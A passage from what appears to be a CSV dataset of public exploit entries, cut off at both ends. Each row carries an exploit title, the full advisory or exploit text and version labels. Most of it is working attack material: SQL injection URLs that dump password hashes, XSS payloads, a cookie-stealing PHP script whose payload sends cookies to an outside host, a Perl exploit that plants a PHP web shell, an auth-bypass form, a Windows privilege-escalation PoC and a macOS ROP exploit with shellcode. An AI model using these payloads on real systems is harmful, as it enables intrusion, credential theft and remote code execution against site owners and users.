sys.argv[1]:getUser(sys.argv[2])         elif ""changePassword"" in sys.argv[1]:changePassword(sys.argv[2],sys.argv[3],sys.argv[4],sys.argv[5])         else:print(""Fail parameter"")     else:print(""Usage: exploit.py getUser [http://ip_adres]\nexploit.py changePassword [http://ip_adres] [username] [new_password] [user_id]"")",['19.09'],1
22318,"Webchat 0.77 - 'Defines.php' Remote File Inclusion source: https://www.securityfocus.com/bid/7000/info  Webchat is prone to an issue that may allow remote attackers to include files located on attacker-controlled servers.  This vulnerability is as a result of insufficient sanitization performed on remote user-supplied data. Under some circumstances, it is possible for remote attackers to influence the path for certain include files to point to an external file by manipulating URI parameters.  If the remote file is a malicious file, this may be exploited to execute arbitrary system commands in the context of the web server.  http://www.example.com/defines.php?WEBCHATPATH=http://www.target.com/db_mysql.php http://www.example.com/defines.php?WEBCHATPATH=http://www.target.com/language/english.php",['0.77'],1
47728,"Nsauditor 3.1.8.0 - 'Name' Denial of Service (PoC) # Exploit Title: Nsauditor 3.1.8.0 - 'Name' Denial of Service (PoC) # Discovery by: SajjadBnd # Date: 2019-11-30 # Vendor Homepage: http://www.nsauditor.com # Software Link: http://www.nsauditor.com/downloads/nsauditor_setup.exe # Tested Version: 3.1.8.0 # Vulnerability Type: Denial of Service (DoS) Local # Tested on OS: Windows 10 - Pro  # About App # Nsauditor Network Security Auditor is a powerful network security tool designed to scan networks and hosts for vulnerabilities,  # and to provide security alerts.Nsauditor network auditor checks enterprise network for all potential methods that  # a hacker might use to attack it and create a report of potential problems that were found , Nsauditor network auditing  # software significantly reduces the total cost of network management in enterprise environments by enabling  # IT personnel and systems administrators gather a wide range of information from all the computers in the network without  # installing server-side applications on these computers and create a report of potential problems that were found.  # PoC # 1.Run the python script, it will create a new file ""dos.txt"" # 3.Run Nsauditor and click on ""Register -> Enter Registration Code"" # 2.Paste the content of dos.txt into the Field: 'Name' # 6.click 'ok' # 5.Crashed ;)   #!/usr/bin/env python buffer = ""\x41"" * 1000 try:     f=open(""dos.txt"",""w"")     print ""[+] Creating %s bytes DOS payload.."" %len(buffer)     f.write(buffer)     f.close()     print ""[+] File created!"" except:     print ""File cannot be created""",['3.1.8.0'],1
22045,"Working Resources BadBlue 1.7.1 - Search Page Cross-Site Scripting source: https://www.securityfocus.com/bid/6253/info  The ext.dll ISAPI does not sufficiently sanitize user-supplied input when processing search queries. This may allow an attacker to create a custom URL containing script code that, when viewed in a browser by a legitimate user, will result in the execution of the script code.   ');alert(document.cookie);// ')"" style=""left:expression(eval('alert(document.cookie)'))"">",['1.7.1'],1
8819,"small pirate 2.1 - Cross-Site Scripting / SQL Injection *********************************************************************************************** *********************************************************************************************** **	       										     ** **  											     ** **     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    ** **     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    ** ** [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    ** **  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\  **==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>-- **  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/     [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    ** **							                                     ** **    											     ** **                          Â¡VIVA SPAIN!...Â¡GANAREMOS EL MUNDIAL!...o.O                      ** **					Â¡PROUD TO BE SPANISH!				     ** **											     ** *********************************************************************************************** ***********************************************************************************************  ---------------------------------------------------------------------------------------------- |       	   	         MULTIPLE REMOTE VULNERABILITIES	             	     | |--------------------------------------------------------------------------------------------| |                                  |    Small Pirates v-2.1   |		 	     	     | |  CMS INFORMATION:		    --------------------------	                     	     | |										             | |-->WEB: http://spirate.net/foro/			          			     | |-->DOWNLOAD: http://spirate.net/foro/			                 		     | |-->DEMO: http://www.santiagoescraches.com.ar/index.php					     | |-->CATEGORY: CMS / Board								     | |											     | |  CMS VULNERABILITY:									     | |											     | |-->TESTED ON: firefox 3						                     | |-->DORK: ""Basado en Spirate""							             | |-->CATEGORY: SQL INJECTION VULNERABILITIES / COOKIE STEALING / BLIND SQL INJECTION          | |-->AFFECT VERSION: <= 2.1						 		     | |-->Discovered Bug date: 2009-05-10							     | |-->Reported Bug date: 2009-05-10							     | |-->Fixed bug date: N/A									     | |-->Info patch: Not fixed							             | |-->Author: YEnH4ckEr									     | |-->mail: y3nh4ck3r[at]gmail[dot]com							     | |-->WEB/BLOG: N/A									     | |-->COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       | |-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)			     | ----------------------------------------------------------------------------------------------   ######################### ////////////////////////  SQL INJECTION (SQLi):  //////////////////////// #########################   <<<<---------++++++++++++++ Condition: Nothing +++++++++++++++++--------->>>>   ------- INTRO: -------   This system is a mixed combinations.  Info by admin (quote):  ""cw*= SMF+Paquetes"" ""Spirate=cw+aÃ±adidos+reparaciones+correcciones""  ""*cw = casitaweb.""   ------------------- PROOFS OF CONCEPT: -------------------   [++] GET var --> 'id'  [++] File vuln --> 'pag1.php'   ~~~~> http://[HOST]/pag1.php?id=-1+UNION+ALL+SELECT+1,2,3,version(),5,6/*   [++] GET var --> 'id'  [++] File vuln --> 'pag1-guest.php'   ~~~~> http://[HOST]/pag1-guest.php?id=-1+UNION+ALL+SELECT+1,2,3,concat(user(),0x3A3A3A,database()),5,6/*   [++] GET var --> 'id'  [++] File vuln --> 'rss-coment_post.php'  [++] Note --> More info in source code   ~~~~> http://[HOST]/web/rss/rss-coment_post.php?id=-1+UNION+ALL+SELECT+1,2,concat(user(),0x3A3A,database()),4,5,6,version(),8/*    [++] GET var --> 'id'  [++] File vuln --> 'rss-pic-comment.php'  [++] Note --> More info in source code   ~~~~> http://[HOST]/web/rss/rss-pic-comment.php?id=-1+UNION+ALL+SELECT+1,2,3,4,current_user(),6,user(),8,9,user(),11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,version(),31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81/*   [++[Return]++] ~~~~~> user, version and database.   ---------- EXPLOITS: ----------   ~~~~> http://[HOST]/pag1.php?id=-1+UNION+ALL+SELECT+1,2,3,concat(memberName,0x3A3A3A,passwd),5,6+FROM+smf_members+WHERE+ID_MEMBER=1/*  ~~~~> http://[HOST]/pag1-guest.php?id=-1+UNION+ALL+SELECT+1,2,3,concat(memberName,0x3A3A3A,passwd),5,6+FROM+smf_members+WHERE+ID_MEMBER=1/*  ~~~~> http://[HOST]/web/rss/rss-coment_post.php?id=-1+UNION+ALL+SELECT+1,2,concat(memberName,0x3A3A3A,passwd),4,5,6,concat(memberName,0x3A3A3A,passwd),8+FROM+smf_members+WHERE+ID_MEMBER=1/*  ~~~~> http://[HOST]/web/rss/rss-pic-comment.php?id=-1+UNION+ALL+SELECT+1,2,3,4,concat(memberName,0x3A3A3A,passwd),6,concat(memberName,0x3A3A3A,passwd),8,9,concat(memberName,0x3A3A3A,passwd),11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,concat(memberName,0x3A3A3A,passwd),31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81+FROM+smf_members+WHERE+ID_MEMBER=1/*   [++[Return]++] ~~~~~> memberName:::passwd in 'members' table    ###################################### //////////////////////////////////////  COOKIE STEALING VULN (BYPASS BBCODE):  ////////////////////////////////////// ######################################   <<<<---------++++++++++++++ Condition: Post a comment +++++++++++++++++--------->>>>   ------- INTRO: -------   This system is a mixed combinations.  Info by admin (quote):  ""cw*= SMF+Paquetes"" ""Spirate=cw+aÃ±adidos+reparaciones+correcciones""  ""*cw = casitaweb.""   ------------------- PROOF OF CONCEPT: -------------------   [url][img]http://www.google.es onmouseover=while(true){alert(1);} [/img][/url]   [++[Return]++] ~~~~~> recursive alert message saying ""1""   ---------- EXPLOIT: ----------   Cookie Grabber Script --> capturethecookies.php  Example Script (Before Creat exploited.txt):  <?php $ck=$_GET[""ck""]; //Capture the cookies	  $manejador=fopen(""exploited.txt"",'a'); fwrite($manejador, ""Cookie:\r\n"".htmlentities($ck).""\r\n--EOF--\r\n""); //Save the values fclose($manejador); echo ""<script>location.href='http://[HOST]/index.php';</script>""; //Redirect... ?>  Example Hosting --> http://www.myphpcookiestealing.es/capturethecookies.php?ck=  Poisoning's comment:  [url][img]http://www.owned.owned onmouseover=document.location=String.fromCharCode(104,116,116,112,58,47,47,119,119,119,46,109,121,112,104,112,99,111,111,107,105,101,115,116,101,97,108,105,110,103,46,101,115,47,99,97,112,116,117,114,101,116,104,101,99,111,111,107,105,101,115,46,112,104,112,63,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,61)+document.cookie [/img][/url]   [++[Return]++] ~~~~~> Cookie and PHPSESSID in exploited.txt   ########################### ///////////////////////////  BLIND SQL INJECTION (SQLi):  /////////////////////////// ###########################   <<<<---------++++++++++++++ Condition: Nothing +++++++++++++++++--------->>>>   ------- INTRO: -------   This system is a mixed combinations.  Info by admin (quote):  ""cw*= SMF+Paquetes"" ""Spirate=cw+aÃ±adidos+reparaciones+correcciones""  ""*cw = casitaweb.""   ------------------- PROOFS OF CONCEPT: -------------------   [++] GET var --> 'id'  [++] File vuln --> 'index.php'   ~~~~> http://[HOST]/?type=rss;action=.xml;sa=comentarios;id=7+and+1=1 --> TRUE  ~~~~> http://[HOST]/?type=rss;action=.xml;sa=comentarios;id=7+and+1=0 --> FALSE   ---------- EXPLOITS: ----------   ~~~~> http://[HOST]/?type=rss;action=.xml;sa=comentarios;id=7+and+substring(@@version,1,1)=5 --> TRUE  ~~~~> http://[HOST]/?type=rss;action=.xml;sa=comentarios;id=7+and+substring(@@version,1,1)=4 --> FALSE    <<<-----------------------------EOF---------------------------------->>>ENJOY IT!   ####################################################################### ####################################################################### ##*******************************************************************## ##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ## ##*******************************************************************## ##-------------------------------------------------------------------## ##*******************************************************************## ## GREETZ TO: JosS, Ulises2k, J.McCray and Spanish Hack3Rs community!## ##*******************************************************************## ####################################################################### #######################################################################  # milw0rm.com [2009-05-29]",['2.1'],1
35811,"Microsoft Windows < 8.1 (x86/x64) - User Profile Service Privilege Escalation (MS15-003) ## Source: https://code.google.com/p/google-security-research/issues/detail?id=123  Platform: Windows 8.1 Update 32/64 bit (No other OS tested)  When a user logs into a computer the User Profile Service is used to create certain directories and mount the user hives (as a normal user account cannot do so). In theory the only thing which needs to be done under a privileged account (other than loading the hives) is creating the base profile directory. This should be secure because c:\users requires administrator privileges to create. The configuration of the profile location is in HKLM so that can’t be influenced.   However there seems to be a bug in the way it handles impersonation, the first few resources in the profile get created under the user’s token, but this changes to impersonating Local System part of the way through. Any resources created while impersonating Local System might be exploitable to elevate privilege. Note that this occurs everytime the user logs in to their account, it isn't something that only happens during the initial provisioning of the local profile.   Some identified issues are:  * When creating directories the service does a recursive create, so for example if creating c:\users\user it will first create c:\users then c:\users\user. Probably not exploitable because Users already exists but of course worth remembering that normal users can create directories in the c: drive root. So always a possibility being able to place a junction point at c:\users on some systems.  * The service creates the temporary folder for the user in CreateTempDirectoryForUser and gets the value from the user’s hive Environment key (TEMP and TMP). This folder is created under system privileges. All it requires is the string starts with %USERPROFILE% so you can do relative paths or just replace USERPROFILE in the environment. This probably isn't that useful on the whole as the security of the directory is inherited from the parent.  * Creation of AppData\LocalLow folder in EnsurePreCreateKnownFolders. This might be exploited to set an arbitrary directory’s integrity level to Low as it tries to set the label explicitly. But that’s probably only of interest if there’s a directory which a normal user would be able to write to but is blocked by a high/system integrity level which is unlikely.   * Probably most serious is the handling of the %USERPROFILE\AppData\Local\Microsoft\Windows\UsrClass.dat registry hive. The profile service queries for the location of AppData\Local from the user’s registry hive then tries to create the Windows folder and UsrClass.dat file. By creating a new folder structure, changing the user's  shell folders registry key and placing a junction in the hierarchy you can get this process to open any other UsrClass.dat file on the system, assuming it isn't already loaded.   For example you could create a directory hierarchy like: %USERPROFILE%\AppData\NotLocal\Microsoft\Windows -> c:\users\administrator\appdata\local\Microsoft\windows  Then set HKCU\Software\Microsoft\Windows\Explorer\User Shell Folders\Local AppData to %USERPROFILE%\AppData\NotLocal.  It seems to even set the root key security when it does so, this might be useful for privilege escalation. This has a chicken-and-egg problem in that the NtLoadKey system call will create the file if it doesn't exist (it sets the FILE_OPEN_IF disposition flag), but you must be running as an administrator  otherwise the privilege check for SeRestorePrivilege will fail.  I've looked at the implementation on Windows 7 and there are a few similar issues but Windows 8.1 implementation of the services does a lot more things. At least the most serious UsrClass.dat issue exists in 7.   Attached is a batch file PoC for Windows 8.1 Update which demonstrates the temporary folder issue. To verify perform the following steps: 1) Execute the batch file as a normal user (this was tested with a local account, not a Microsoft online linked account, or domain). This will change the environment variables TEMP and TMP to be %USERPROFILE%\..\..\..\..\Windows\faketemp 2) Logout then log back in again 3) Observe that the directory \Windows\faketemp has been created.      reg add HKCU\Environment /v TEMP /f /t REG_EXPAND_SZ /d %%USERPROFILE%%\..\..\..\..\..\windows\faketemp reg add HKCU\Environment /v TMP /f /t REG_EXPAND_SZ /d %%USERPROFILE%%\..\..\..\..\..\windows\faketemp","['< 8.1 (x86/x64)', '8.1 Update 32/64']",1
12494,"Winamp 5.572 - Local Crash (PoC) #!\C:\Perl\bin ##################################{In The Name Of Allah The Mercifull}######################  # Title : WiNamP V5.572 0day suffer from local CRASH PoC # Tested : Windows xp (sp3)  # AUThoR: R3d-D3v!L # Credits to : XP10_HACKER     XP10.ME  print qq(  ###################################################  ## WiNamP V5.572 0day (SWF) local CRASH PoC      ##  ## Credits : XP10.ME                             ##  ##           XP10_HACKER                         ##  ## Author : R3d-D3v!L       <X[at]hotmail.co.jp> ##  ## Greetz : DR_DAShER   &  JUPA                  ##  ## all member at XP10.ME                         ##  ###################################################  );  $XP10_hacker=""\nbody {alink: "".""A/"" x 9999999 .""}\n"";  open(file ,'>>X.swf');  print file $XP10_hacker;  print ""CODED BY R3d-D3V!L~#\n""; close(file);   #[~]-----------------------------{((MAGOUSH-87))}---------------------------------------  #[~] Greetz tO: [dolly & MERNA & DEV!L_MODY & po!S!ON Sc0rp!0N & mAG0ush-1987] #[~]70 ALL ARAB!AN HACKER 3X3PT : LAM3RZ  #[~] spechial thanks : ab0 mohammed & XP_10 h4CK3R & JASM!N & c0prA & MARWA & N0RHAN & S4R4  #[?]spechial SupP0RT : MY M!ND   #[?]4r48!4n.!nforma7!0N.53cur!7y ---> ((r3d D3v!L<--M2Z--->JUPA<---aNd--->Devil ro0t))  #[~]spechial FR!ND: 0r45hy #[~] !'M 4R48!4N 3XPL0!73R. #[~]{[(D!R 4ll 0R D!E)]};     #[~]---------------------------------------------------------------------------------------------",['5.572'],1
45422,"Netis ADSL Router DL4322D RTK 2.1.1 - Cross-Site Scripting # Exploit Title: Netis ADSL Router DL4322D RTK 2.1.1 - Cross-Site Scripting # Author: Cakes # Discovery Date: 2018-09-16 # Vendor Homepage: http://www.netis-systems.com # Software Link: http://www.netis-systems.com/Home/detail/id/74.html # Tested Version: RTK 2.1.1 # Tested on OS: Kali Linux # CVE: N/A  # Description: # Improper input validation on the  router web interface allows attackers add a persistent  # Cross-Site scripting attack on the Dynamic DNS hostname field. Simply intercept a renaming  # request and add in the XSS  # Poc  POST /form2Ddns.cgi HTTP/1.1 Host: Target User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate DNT: 1 Referer: http://Target/ddns.htm?v=1537192256000 Cookie: SessionID= Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 119  ddnsProv=0&hostname=<script>alert(""Cakes"");</script>&interface=15&enable=on&username=tester&password=tester&addacc=Add&submit.htm%3Fddns.htm=Send",['2.1.1'],1
7545,"yourplace 1.0.2 - Multiple Vulnerabilities / Remote Code Execution [START]  ############################################################################################################################################ [0x01] Informations:  Script         : YourPlace 0.5 (beta 1) Download       : http://www.hotscripts.com/jump.php?listing_id=80545&jump_type=1 Vulnerability  : DB Disclosure / Arbitrary Data Saving (RCE EXPLOIT) / Arbitrary File Upload / PHPInfo Disclosure / User Change Account Author         : Osirys Contact        : osirys[at]live[dot]it Website        : http://osirys.org Notes          : Proud to be Italian Greets:        : XaDoS, x0r, emgent, Jay, str0ke, Todd and AlpHaNiX  * This script has also other vulnerability. Here you can find just the major ones !   I wrote a simple RCE Exploit also.   ############################################################################################################################################ [0x02] Bug: [Database Disclosure] ######  Vulnerable file is: /[path]/user/info/users.txt  This script uses a .txt file to store usernames and passwords.  ### [!] EXPLOIT:                  1) Go at: /[path]/user/info/users.txt                  2) Get username and password !                  ex: osirys	$1$H9mfzCTo$gbuasEowB1agfEqWolcGR.                      username   password crypted with crypt function   ############################################################################################################################################ [0x03] Bug: [Arbitrary Data Saving] ## RCE EXPLOIT !! ######  Bugged file is: /[path]/internettoolbar/edit.php  To exploit this vulnerability, we must be logged in.  [CODE]  				$fav5_url = $_POST['fav5_url']; 				$fav1_name = $_POST['fav5_name']; 				 				$write = ""<? \n &#36;homepage = '"".$homepage.""';\n \n  									&#36;fav1_url = '"".$fav1_url.""';\n 									&#36;fav1_name = '"".$fav1_name.""';\n \n 									&#36;fav2_url = '"".$fav2_url.""';\n 									&#36;fav2_name = '"".$fav2_name.""';\n \n 									&#36;fav3_url = '"".$fav3_url.""';\n 									&#36;fav3_name = '"".$fav3_name.""';\n \n 									&#36;fav4_url = '"".$fav4_url.""';\n 									&#36;fav4_name = '"".$fav4_name.""';\n \n 									&#36;fav5_url = '"".$fav5_url.""';\n 									&#36;fav5_name = '"".$fav5_name.""';\n \n ?>""; 									 				$write = str_replace('&#36;','$',$write); 				$fp = fopen(""../user/internettoolbar/index.php"", ""w+""); 				$fw = fwrite($fp, $write);  [/CODE]  All the $fav variables come from POST. There is any cheek on what the user put in the form of $fav vars. Then the script will save the value of this vars in /[path]/user/internettoolbar/index.php. So we can put an evil php code ;) I wrote a simple exploit, a simple proof of concept, change it in your own way ;) This exploit can be adapted to your own needs.  ############################################################ ########################################## ## Remote Command Execution Perl Exploit  [code]  #!/usr/bin/perl  use HTTP::Request; use LWP::UserAgent;  my $path      = ""/internettoolbar/edit.php""; my $exec_path = ""/user/internettoolbar/index.php""; my $c0de      = ""lol.it';?><?php system(\$_GET['cmd']);'""; my $host      = $ARGV[0];   ($host) || help(""-1""); cheek($host) == 1 || help(""-2""); &banner;  print ""[+] Connecting to $host ..\n""; print ""[+] Writing hell php code ..\n"";  my $url = $host.$path;  my $ua = LWP::UserAgent->new; my $post = $ua->post($url,                           [                             fav1_url => $c0de,                             do       => submit                           ]);  if ($post->is_success) {     print ""[+] Commands:\n"";     print ""    exit         -> quit the exploit \n"";     print ""    your command -> exec your cmd    \n"";     &exec_cmd; } else {     print ""[-] Can't write hell code !\n"";     exit(0); }  sub exec_cmd {     print ""shell[Osirys]$>\n"";     $cmd = <STDIN>;     $cmd !~ /exit/ || die ""[-] Quitting ..\n"";     $exec_url = ($host.$exec_path.""?cmd="".$cmd);     $re = query($exec_url);     if ($re =~ /\?>(.*)/) {         print ""[*] $1\n"";         &exec_cmd;     }     else {         print ""[-] Undefined output or bad cmd !\n"";         &exec_cmd;     } }  sub query() {     $link = $_[0];     my $req = HTTP::Request->new(GET => $link);     my $ua = LWP::UserAgent->new();     $ua->timeout(4);     my $response = $ua->request($req);     return $response->content; }  sub cheek() {     my $host = $_[0];     if ($host =~ /http:\/\/(.*)/) {         return 1;     }     else {         return 0;     } }  sub banner {     print ""\n"".           ""  ============================ \n"".           ""     YourPlace RCE Exploit     \n"".           ""      Coded by Osirys          \n"".           ""      osirys[at]live[dot]it    \n"".           ""      Proud to be italian      \n"".           ""  ============================ \n\n""; }  sub help() {     my $error = $_[0];     if ($error == -1) {         &banner;         print ""\n[-] Cheek that you typed the hostname address and the command to execute !\n"";     }     elsif ($error == -2) {         &banner;         print ""\n[-] Bad hostname address !\n"";     }     print ""[*] Usage : perl $0 http://hostname/cms_path\n\n"";     exit(0); }  [/CODE]   ############################################################################################################################################ [0x04] Bug: [Arbitrary File Upload] ######  Bugged file is: /[path]/apps/standard/upload.php  To upload our local file we must be logged in. Then we can upload any file. The bug here is to allow user to upload file of any extensions, in fact there isn't any extension cheek.   ### [!] EXPLOIT:                   1) Go at: /[path]/apps/standard/upload.php                  2) Upload your local file.                  3) Cheek it here: /[path]/user/uploads/your_file.your_ext   ############################################################################################################################################ [0x05] Bug: [PHPInfo Disclosure] ######  Vulnerable file is: /[path]/user/uploads/phpinfo.php   ### [!] EXPLOIT:                  1) Go at /[path]/user/uploads/phpinfo.php                  2) Get php information   ############################################################################################################################################ [0x06] Bug: [User Change Account] ######  Bugged file is: /[path]/login/register.php  [CODE]  if (isset ($_POST['submit'])) { 	$fp = fopen ( '../user/info/users.txt', 'w+' ); 	 	if ($fp){ 		$data = $_POST['username'].""\t"".crypt($_POST['password']).""\r\n""; 		fwrite ( $fp, $data ); 		fclose ( $fp ); 		echo "":-)""; 	}  [/CODE]  Registering a new user, the old one will be deleted.   ### [!] EXPLOIT: Go at: /[path]/login/register_form.php                  Register your new user   ############################################################################################################################################  [/END]  # milw0rm.com [2008-12-22]",['1.0.2'],1
4346,"phpBB Links MOD 1.2.2 - SQL Injection #!/usr/bin/perl  print q{  phpBB <= 2.0.22 - Links MOD <= v1.2.2 Remote SQL Injection Exploit  Bug discovered by Don Dork: allinurl:links.php?t=search    or: ""Links MOD v1.2.2 by phpBB2.de"" SQL INJECTION: Exploit: links.php?t=search&search_keywords=asd&start=1,1%20UNION%20SELECT%201,username,user_password,4,5,6,7,8,9,10,11,12%20FROM%20phpbb_users%20WHERE%20user_id=2/*  };  use IO::Socket;  print q{ => Insert URL => without ( http ) => }; $server = <STDIN>; chop ($server); print q{ => Insert directory => es: /forum/ - /phpBB2/ => }; $dir = <STDIN>; chop ($dir); print q{ => User ID => Number: => }; $user = <STDIN>; chop ($user); if (!$ARGV[2]) { } $myuser = $ARGV[3]; $mypass = $ARGV[4]; $myid = $ARGV[5]; $server =~ s/(http:\/\/)//eg; $path = $dir; $path .= ""links.php?t=search&search_keywords=asd&start=1,1%20UNION%20SELECT%201,username,user_password,4,5,6,7,8,9,10,11,12%20FROM%20phpbb_users%20WHERE%20user_id="".$user.""/*""; print "" Exploit in process...\r\n""; $socket = IO::Socket::INET->new( Proto => ""tcp"", PeerAddr => ""$server"", PeerPort => ""80"") || die ""Exploit failed""; print ""Exploit\r\n""; print ""in process...\r\n""; print $socket ""GET $path HTTP/1.1\r\n""; print $socket ""Host: $server\r\n""; print $socket ""Accept: */*\r\n""; print $socket ""Connection: close\r\n\r\n""; print ""Exploit finished!\r\n\r\n""; while ($answer = <$socket>) { if ($answer =~/(\w{32})/) { if ($1 ne 0) { print ""MD5-Hash is: "".$1.""\r\n""; } exit(); } }  # milw0rm.com [2007-08-31]",['1.2.2'],1
8161,"celerbb 0.0.2 - Multiple Vulnerabilities *******   Salvatore ""drosophila"" Fresta   *******  [+] Application: CelerBB [+] Version: 0.0.2 [+] Website: http://celerbb.sourceforge.net/  [+] Bugs: [A] Multiple SQL Injection           [B] Information Disclosure           [C] Authenticaion Bypass  [+] Exploitation: Remote [+] Date: 05 Mar 2009  [+] Discovered by: Salvatore ""drosophila"" Fresta [+] Author: Salvatore ""drosophila"" Fresta [+] Contact: e-mail: drosophilaxxx@gmail.com   *************************************************  [+] Menu  1) Bugs 2) Code 3) Fix   *************************************************  [+] Bugs   - [A] Multiple SQL Injection  [-] Requisites: magic_quotes_gpc = off [-] File affected: viewforum.php, viewtopic.php  This bug allows a guest to view username and password list.   - [B] Information Disclosure  [-] Requisites: none [-] File affected: showme.php  This bug allows a guest to view reserved information of any user.   - [C] Authentication Bypass  [-] Requisites: magic_quotes_gpc = off [-] File affected: login.php  This bug allows a guest to bypass authentication.   *************************************************  [+] Code   - [A] Multiple SQL Injection  http://www.site.com/path/viewforum.php?id=-1' UNION ALL SELECT 1,2,GROUP_CONCAT(CONCAT(username, 0x3a, password)),4,5,6,7,8 FROM celer_users%23  http://www.site.com/path/viewtopic.php?id=1' UNION ALL SELECT 1,2,3,NULL,5,6,GROUP_CONCAT(CONCAT(username, 0x3a, password)),NULL FROM celer_users%23   - [B] Information Disclosure  http://www.site.com/path/showme.php?user=admin   - [C] Authentication Bypass  <html>   <head>     <title>CelerBB 0.0.2 Authentication Bypass Exploit</title>   </head>   <body>     <form action=""login.php"" method=""POST"">       <input type=""hidden"" name=""Username"" value=""admin'#"">       <input type=""submit"" value=""Exploit"">     </form>   </body> </html>   *************************************************  [+] Fix  No fix.   *************************************************  # milw0rm.com [2009-03-05]",['0.0.2'],1
14272,"UFO: Alien Invasion 2.2.1 (OSX Snow Leopard) - IRC Client Remote Code Execution (ROP) #!/usr/bin/python  # UFO: Alien Invasion v2.2.1 IRC Client Remote Code Execution - MacOSX # OS X Snow Leopard: d1dn0t # OS X Leopard: dookie # Windows PoC: Jason Geffner http://www.exploit-db.com/exploits/14013  import sys, socket, struct  WRITEABLE = 0x8fe66448 STRCPY=0x8fe2db10  shellcode = (""\xdb\xc3\xd9\x74\x24\xf4\xbb\xf3\xbd\x8d\x7c\x33\xc9\x5d\xb1"" ""\x27\x31\x5d\x18\x03\x5d\x18\x83\xc5\xf7\x5f\x78\x4d\x37\x06"" ""\xd3\xee\xe7\x79\x84\xbc\xb7\x1b\xe9\xc1\xb8\x59\x8f\xc1\xc6"" ""\x5d\xf9\x04\x94\x0f\xab\xe0\x18\xb2\x5a\xad\x91\x51\x36\x5d"" ""\xf2\xc3\x95\xed\x9c\x26\x99\x7c\x3b\xeb\xcc\xd2\x73\x61\x3c"" ""\x52\x01\x28\xec\x01\xb3\x86\xa0\xb8\xf6\xa7\xb3\x90\x81\x6f"" ""\x02\xc2\x12\x84\x64\xb7\x47\x0c\x34\x87\x3d\x7f\x3a\x95\x82"" ""\xfc\xc0\x59\x71\xf2\x06\x9e\x29\xa4\x38\x4e\x79\x7f\x74\xee"" ""\xe9\x10\xba\xc2\x7c\x18\x73\x5e\xb3\x9a\xf0\xa5\x4b\xef\xe1"" ""\x68\x8b\x5f\x66\xa4\x24\x13\x1e\xd2\x15\xb1\xb7\x4c\xe0\xd6"" ""\x18\xc1\xa1\x48\x29\xda\x88\xe9\x78\xdd\x42\x63\x99\x8d\x32"" ""\x20\x0e\x7e\x02\xc1\x63\xfe\x53\x0e\x2b\xaf\xd3\x43\x4c\x45"")  # ==================== Put stack pointer into EAX/EDX ====================  ROP = 	struct.pack('<I',0x8fe2b3d4)        # POP - RET Insturction - Pop's over the writeable value below ROP += 	struct.pack('<I',WRITEABLE)					# Required Writeable address here for exploit to work ROP += 	struct.pack('<I',0x8fe2fb63)				# pop eax # ret ROP += 	struct.pack('<I',WRITEABLE)					# Pop writeable address into eax for instructions below ROP += 	struct.pack('<I',0x8fe2fb58)				# push esp # and al,0x4 # mov [eax+0x28],edx # mov edx,[esp] # mov [eax],edx # pop eax # ret   # ==================== Jump Over Parameters below ====================  ROP += 	struct.pack('<I',0xffff1d6b)				# add esp,byte +0x1c # pop ebp # ret  # ==================== strcpy call ====================  ROP += 	struct.pack('<I',STRCPY)						# use strcpy to copy shellcode from stack to heap ROP += 	struct.pack('<I',0x8fe2dfd1)				# POP - POP - RET over strcpy params ROP += 	struct.pack('<I',WRITEABLE)					# Dst Param for strcpy ROP += 	'EEEE'															# Src Param for strcpy ROP += 	struct.pack('<I',WRITEABLE)					# Move execution to where we moved our shell ROP += 	'C'*12															# Padding   # ==================== Craft Parameter 2  ====================   # Need to inc EAX or EDX to point to shell code  # Store  0x40 in ECX ROP += 	struct.pack('<I',0x8fe2dae4)					# mov ecx,[esp+0x4] # add eax,edx # sub eax,ecx # ret   ROP += 	struct.pack('<I',0x8fe2b3d4) 	       		    # POP - RET Insturction - Pop's over the value below ROP += 	struct.pack('<I',0xffffffff)					# Value to store in ecx ROP += 	struct.pack('<I',0x8fe0c0c7)					# inc ecx # xor al,0xc9 ROP += 	struct.pack('<I',0x8fe0c0c7)					# inc ecx # xor al,0xc9 ROP += 	struct.pack('<I',0x8fe24b3c)			 		# add ecx,ecx # ret ROP += 	struct.pack('<I',0x8fe24b3c)					# add ecx,ecx # ret ROP += 	struct.pack('<I',0x8fe24b3c)					# add ecx,ecx # ret ROP += 	struct.pack('<I',0x8fe24b3c)					# add ecx,ecx # ret  # Replace stack pointer back into eax as it was trashed ROP += 	struct.pack('<I',0x8fe2c71d)					# mov eax,edx # ret  # Add offset to paramter  ROP += 	struct.pack('<I',0x8fe2def4)					# add eax,ecx # ret  # Swap over so we can work on fresh copy of saved ESP ROP += 	struct.pack('<I',0x8fe0e32d)					# xchg eax,edx  # Double ECX a few more times to point to our nop sled/shell code ROP += 	struct.pack('<I',0x8fe0c0c7)					# inc ecx # xor al,0xc9 ROP += 	struct.pack('<I',0x8fe0c0c7)					# inc ecx # xor al,0xc9 ROP += 	struct.pack('<I',0x8fe24b3c)					# add ecx,ecx # ret ROP += 	struct.pack('<I',0x8fe24b3c)					# add ecx,ecx # ret ROP += 	struct.pack('<I',0x8fe24b3c)					# add 